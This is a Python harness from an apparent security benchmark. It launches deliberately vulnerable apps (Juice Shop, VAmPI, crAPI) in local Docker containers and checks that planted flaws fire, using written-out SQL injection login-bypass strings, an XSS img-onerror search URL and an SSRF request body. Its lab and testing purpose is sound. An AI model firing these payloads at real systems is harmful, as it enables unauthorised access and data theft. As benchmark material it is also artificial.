from __future__ import annotations

import atexit
import contextlib
import json
import os
import subprocess
import time
import urllib.error
import urllib.request
from collections.abc import Iterator
from dataclasses import dataclass
from pathlib import Path
from urllib.parse import quote

from benchmark.harness.score import Finding
from benchmark.matrix.registry import Cell

_JUICE_IMAGE = (
    "bkimminich/juice-shop@sha256:"
    "73c53fbf442e8337b3ea3d98c7e8550308854701ebdfce4cc39768f36b75430e"
)
_VAMPI_IMAGE = (
    "erev0s/vampi@sha256:"
    "0a5a224b6e14ae7da6a6ea265178ff71286ff903aec74adee98f660bb0e4ca12"
)
_JSON = (("Content-Type", "application/json"),)
_PROJECT = "insidia-live"
_XSS_PATH = (
    "/#/search?q=%3Cimg%20src%3Dx%20onerror%3Ddocument.title%3D%22insidia-xss%22%3E"
)
_VAMPI_SQLI = "/users/v1/" + quote("nosuch' OR '1'='1", safe="")


@dataclass(frozen=True)
class RunApp:
    name: str
    image: str
    container_port: int
    host_port: int


@dataclass(frozen=True)
class ComposeApp:
    name: str
    web_port: int
    waves: tuple[tuple[str, ...], ...]
    marker_name: str
    marker_image: str
    marker_port: int
    marker_body: str


@dataclass(frozen=True)
class HttpCheck:
    method: str
    path: str
    body: bytes | None
    headers: tuple[tuple[str, str], ...]
    marker: str
    status: int


@dataclass(frozen=True)
class DomCheck:
    path: str
    marker: str


@dataclass(frozen=True)
class OnceGet:
    path: str
    marker: str


@dataclass(frozen=True)
class BearerLogin:
    signup_path: str
    signup_body: bytes
    login_path: str
    login_body: bytes


@dataclass(frozen=True)
class LiveCase:
    app: RunApp | ComposeApp
    check: HttpCheck | DomCheck
    setup: OnceGet | BearerLogin | None = None


_JUICE = RunApp("insidia-juice", _JUICE_IMAGE, 3000, 3000)
_VAMPI = RunApp("insidia-vampi", _VAMPI_IMAGE, 5000, 5000)
_CRAPI = ComposeApp(
    "crapi",
    8888,
    (
        (
            "postgresdb",
            "mongodb",
            "mailhog",
            "crapi-identity",
            "crapi-community",
            "crapi-workshop",
        ),
        ("chromadb", "crapi-chatbot"),
        ("crapi-web",),
    ),
    "insidia-marker",
    _VAMPI_IMAGE,
    8080,
    "insidia-ssrf-plant",
)

_CHECKS: dict[tuple[str, str], LiveCase] = {
    ("juiceshop", "web.sqli"): LiveCase(
        _JUICE,
        HttpCheck(
            "POST",
            "/rest/user/login",
            b'{"email":"\' or 1=1--","password":"x"}',
            _JSON,
            "admin@juice-sh.op",
            200,
        ),
    ),
    ("juiceshop", "web.xss"): LiveCase(
        _JUICE,
        DomCheck(_XSS_PATH, '<img src="x" onerror='),
    ),
    ("vampi", "web.sqli"): LiveCase(
        _VAMPI,
        HttpCheck("GET", _VAMPI_SQLI, None, (), "mail1@mail.com", 200),
        OnceGet("/createdb", "Database populated."),
    ),
    ("crapi", "web.ssrf"): LiveCase(
        _CRAPI,
        HttpCheck(
            "POST",
            "/workshop/api/merchant/contact_mechanic",
            b'{"mechanic_api":"http://insidia-marker:8080/plant"}',
            (
                *_JSON,
                ("Authorization", "Bearer {token}"),
            ),
            "insidia-ssrf-plant",
            200,
        ),
        BearerLogin(
            "/identity/api/auth/signup",
            (
                b'{"name":"Insidia Plant","email":"insidia-ssrf@example.com",'
                b'"number":"9999999999","password":"Insidia1"}'
            ),
            "/identity/api/auth/login",
            b'{"email":"insidia-ssrf@example.com","password":"Insidia1"}',
        ),
    ),
}

_STARTED: list[str] = []
_COMPOSE: tuple[Path, str] | None = None
_HOST_PORT: dict[str, int] = {}
_ONCE: set[str] = set()
_TOKEN: dict[str, str] = {}
_PROVED: dict[tuple[str, str, str], bool] = {}


def live_ready(cell: Cell) -> bool:
    return (
        cell.phase == "1B"
        and cell.box in {"black", "gray"}
        and cell.conn in {"direct", "tunnel"}
        and (cell.target, cell.attack) in _CHECKS
    )


def prove_live(cell: Cell) -> list[Finding]:
    key = (cell.target, cell.attack, cell.conn)
    proved = _PROVED.get(key)
    if proved is None:
        proved = _hit(cell)
        _PROVED[key] = proved
    if not proved:
        return []
    return [Finding(cell.plant_ids[0])]


def _hit(cell: Cell) -> bool:
    case = _CHECKS[(cell.target, cell.attack)]
    host = _ensure(case.app)
    token = _prepare(case, host)
    with _view(cell.conn, host) as port:
        return _matches(case.check, port, token)


@contextlib.contextmanager
def _view(conn: str, port: int) -> Iterator[int]:
    if conn == "direct":
        yield port
        return
    from benchmark.harness.run_cell import _start_tunnel

    listener, thread = _start_tunnel(port)
    try:
        yield int(listener.getsockname()[1])
    finally:
        listener.close()
        thread.join(timeout=2)


def _matches(check: HttpCheck | DomCheck, port: int, token: str | None) -> bool:
    if isinstance(check, DomCheck):
        return _dom(port, check)
    status, body = _exchange(port, check.method, check.path, check.body, check.headers, token)
    return status == check.status and check.marker in body


def _prepare(case: LiveCase, port: int) -> str | None:
    setup = case.setup
    if isinstance(setup, OnceGet):
        if case.app.name not in _ONCE:
            _status, body = _exchange(port, "GET", setup.path, None, (), None)
            if setup.marker not in body:
                raise RuntimeError(f"{setup.path} missing {setup.marker}")
            _ONCE.add(case.app.name)
        return None
    if isinstance(setup, BearerLogin):
        cached = _TOKEN.get(case.app.name)
        if cached is None:
            cached = _bearer(port, setup)
            _TOKEN[case.app.name] = cached
        return cached
    return None


def _bearer(port: int, setup: BearerLogin) -> str:
    status, body = _exchange(
        port,
        "POST",
        setup.signup_path,
        setup.signup_body,
        _JSON,
        None,
    )
    if status not in {200, 403}:
        raise RuntimeError(f"signup returned {status}: {body[:300]}")
    status, body = _exchange(
        port,
        "POST",
        setup.login_path,
        setup.login_body,
        _JSON,
        None,
    )
    if status != 200:
        raise RuntimeError(f"login returned {status}: {body[:300]}")
    payload = json.loads(body)
    token = payload.get("token") if isinstance(payload, dict) else None
    if not isinstance(token, str) or token == "":
        raise RuntimeError("login returned no token")
    return token


def _exchange(
    port: int,
    method: str,
    path: str,
    body: bytes | None,
    headers: tuple[tuple[str, str], ...],
    token: str | None,
) -> tuple[int, str]:
    rendered: dict[str, str] = {}
    for key, value in headers:
        if "{token}" in value:
            if token is None:
                raise RuntimeError(f"{path} needs a token")
            value = value.replace("{token}", token)
        rendered[key] = value
    request = urllib.request.Request(
        f"http://127.0.0.1:{port}{path}",
        data=body,
        headers=rendered,
        method=method,
    )
    try:
        with urllib.request.urlopen(request, timeout=10) as response:
            return int(response.status), response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return int(exc.code), exc.read().decode("utf-8", "replace")


def _dom(port: int, check: DomCheck) -> bool:
    url = f"http://127.0.0.1:{port}{check.path}"
    for _ in range(8):
        result = _chrome(url)
        if check.marker in result.stdout:
            return True
        if result.returncode != 0:
            detail = (result.stderr or result.stdout).strip()
            raise RuntimeError(f"google-chrome exited {result.returncode}: {detail[-1500:]}")
    return False


def _chrome(url: str) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        [
            "google-chrome",
            "--headless=new",
            "--disable-gpu",
            "--no-sandbox",
            "--timeout=8000",
            "--virtual-time-budget=5000",
            "--dump-dom",
            url,
        ],
        capture_output=True,
        text=True,
        timeout=30,
        check=False,
    )


def _ensure(app: RunApp | ComposeApp) -> int:
    if isinstance(app, RunApp):
        return _ensure_run(app)
    return _ensure_compose(app)


def _ensure_run(app: RunApp) -> int:
    cached = _HOST_PORT.get(app.name)
    if cached is not None:
        return cached
    if not _adopt_run(app):
        if _inspect(app.name, "{{.State.Status}}") is not None:
            _docker(["rm", "-f", app.name])
        _docker(
            [
                "run",
                "-d",
                "--name",
                app.name,
                "-p",
                f"127.0.0.1:{app.host_port}:{app.container_port}",
                app.image,
            ]
        )
        _STARTED.append(app.name)
    _wait_http(app.host_port, "/")
    _HOST_PORT[app.name] = app.host_port
    return app.host_port


def _adopt_run(app: RunApp) -> bool:
    if _inspect(app.name, "{{.State.Running}}") != "true":
        return False
    if _inspect(app.name, "{{.Image}}") != _image_id(app.image):
        return False
    return _binding(app.name, app.container_port) == ("127.0.0.1", str(app.host_port))


def _ensure_compose(app: ComposeApp) -> int:
    cached = _HOST_PORT.get(app.name)
    if cached is not None:
        return cached
    compose_file = _compose_file()
    if not (_inspect("crapi-web", "{{.State.Running}}") == "true" and _http_up(app.web_port)):
        _down_foreign(compose_file)
        _start_waves(app, compose_file)
    _wait_http(app.web_port, "/")
    network = _primary_network("crapi-web")
    _ensure_marker(app, network)
    _HOST_PORT[app.name] = app.web_port
    return app.web_port


def _start_waves(app: ComposeApp, compose_file: Path) -> None:
    global _COMPOSE
    _COMPOSE = (compose_file, _PROJECT)
    for wave in app.waves:
        if "crapi-web" in wave:
            _wait_running("crapi-chatbot")
        _compose(compose_file, _PROJECT, ["up", "-d", *wave])


def _ensure_marker(app: ComposeApp, network: str) -> None:
    if _marker_ok(app, network):
        return
    if _inspect(app.marker_name, "{{.State.Status}}") is not None:
        _docker(["rm", "-f", app.marker_name])
    _docker(
        [
            "run",
            "-d",
            "--name",
            app.marker_name,
            "--network",
            network,
            "--entrypoint",
            "python",
            app.marker_image,
            "-c",
            _marker_program(app),
        ]
    )
    _STARTED.append(app.marker_name)
    _wait_marker(app)


def _marker_ok(app: ComposeApp, network: str) -> bool:
    if _inspect(app.marker_name, "{{.State.Running}}") != "true":
        return False
    if network not in _networks(app.marker_name):
        return False
    return _marker_serves(app)


def _marker_program(app: ComposeApp) -> str:
    literal = json.dumps(app.marker_body)
    return (
        "from http.server import BaseHTTPRequestHandler, HTTPServer\n"
        "class Handler(BaseHTTPRequestHandler):\n"
        "    def do_GET(self):\n"
        f"        payload = {literal}.encode()\n"
        "        self.send_response(200)\n"
        '        self.send_header("Content-Length", str(len(payload)))\n'
        "        self.end_headers()\n"
        "        self.wfile.write(payload)\n"
        "    def log_message(self, fmt, *args):\n"
        "        return\n"
        f'HTTPServer(("0.0.0.0", {app.marker_port}), Handler).serve_forever()\n'
    )


def _marker_serves(app: ComposeApp) -> bool:
    code = (
        "import urllib.request\n"
        "body = urllib.request.urlopen("
        f"'http://127.0.0.1:{app.marker_port}/plant', timeout=2).read().decode()\n"
        "print(body)\n"
    )
    result = subprocess.run(
        ["docker", "exec", app.marker_name, "python", "-c", code],
        capture_output=True,
        text=True,
        timeout=10,
        check=False,
    )
    return result.returncode == 0 and app.marker_body in result.stdout


def _wait_marker(app: ComposeApp) -> None:
    deadline = time.monotonic() + 20
    while time.monotonic() < deadline:
        if _marker_serves(app):
            return
        time.sleep(0.2)
    raise RuntimeError(f"{app.marker_name} did not serve {app.marker_body}")


def _down_foreign(compose_file: Path) -> None:
    project = _inspect("crapi-web", '{{index .Config.Labels "com.docker.compose.project"}}')
    if project:
        _compose(compose_file, project, ["down"])


def _compose(compose_file: Path, project: str, args: list[str], *, timeout: float = 600) -> None:
    env = os.environ.copy()
    env["TLS_ENABLED"] = "false"
    env["COMPOSE_PROJECT_NAME"] = project
    result = subprocess.run(
        ["docker", "compose", "-f", str(compose_file), "-p", project, *args],
        cwd=compose_file.parent,
        env=env,
        capture_output=True,
        text=True,
        timeout=timeout,
        check=False,
    )
    if result.returncode != 0:
        detail = (result.stderr or result.stdout).strip()
        raise RuntimeError(f"docker compose {' '.join(args)} failed: {detail}")


def _compose_file() -> Path:
    return _local_targets() / "crAPI" / "deploy" / "docker" / "docker-compose.yml"


def _local_targets() -> Path:
    override = os.environ.get("INSIDIA_LOCAL_TARGETS")
    if override:
        return Path(override)
    return Path(__file__).resolve().parents[3] / "local-targets"


def _wait_http(port: int, path: str) -> None:
    deadline = time.monotonic() + 120
    last = "no response"
    while time.monotonic() < deadline:
        if _http_up(port, path):
            return
        last = f"127.0.0.1:{port}{path}"
        time.sleep(0.5)
    raise RuntimeError(f"{last} did not answer")


def _http_up(port: int, path: str = "/") -> bool:
    try:
        with urllib.request.urlopen(f"http://127.0.0.1:{port}{path}", timeout=2) as response:
            response.read()
            return int(response.status) < 500
    except urllib.error.HTTPError as exc:
        return int(exc.code) < 500
    except OSError:
        return False


def _wait_running(name: str) -> None:
    deadline = time.monotonic() + 180
    while time.monotonic() < deadline:
        if _inspect(name, "{{.State.Running}}") == "true":
            return
        time.sleep(1)
    raise RuntimeError(f"{name} did not start")


def _binding(name: str, container_port: int) -> tuple[str, str] | None:
    raw = _inspect(name, "{{json .NetworkSettings.Ports}}")
    if raw is None:
        return None
    ports = json.loads(raw)
    bindings = ports.get(f"{container_port}/tcp") if isinstance(ports, dict) else None
    if not bindings:
        return None
    first = bindings[0]
    return str(first.get("HostIp", "")), str(first.get("HostPort", ""))


def _networks(name: str) -> set[str]:
    raw = _inspect(name, "{{json .NetworkSettings.Networks}}")
    if raw is None:
        return set()
    payload = json.loads(raw)
    if not isinstance(payload, dict):
        return set()
    return set(payload)


def _primary_network(name: str) -> str:
    names = _networks(name)
    if not names:
        raise RuntimeError(f"{name} has no network")
    return sorted(names)[0]


def _image_id(ref: str) -> str:
    result = subprocess.run(
        ["docker", "image", "inspect", "-f", "{{.Id}}", ref],
        capture_output=True,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        detail = (result.stderr or result.stdout).strip()
        raise RuntimeError(f"missing image {ref}: {detail}")
    return result.stdout.strip()


def _inspect(name: str, fmt: str) -> str | None:
    result = subprocess.run(
        ["docker", "inspect", "-f", fmt, name],
        capture_output=True,
        text=True,
        check=False,
    )
    if result.returncode != 0:
        return None
    return result.stdout.strip()


def _docker(args: list[str]) -> None:
    result = subprocess.run(
        ["docker", *args],
        capture_output=True,
        text=True,
        timeout=180,
        check=False,
    )
    if result.returncode != 0:
        detail = (result.stderr or result.stdout).strip()
        raise RuntimeError(f"docker {' '.join(args[:4])} failed: {detail}")


def _stop_started() -> None:
    for name in reversed(_STARTED):
        subprocess.run(
            ["docker", "rm", "-f", name],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            check=False,
        )
    if _COMPOSE is None:
        return
    compose_file, project = _COMPOSE
    env = os.environ.copy()
    env["COMPOSE_PROJECT_NAME"] = project
    subprocess.run(
        ["docker", "compose", "-f", str(compose_file), "-p", project, "down"],
        cwd=compose_file.parent,
        env=env,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    )


atexit.register(_stop_started)
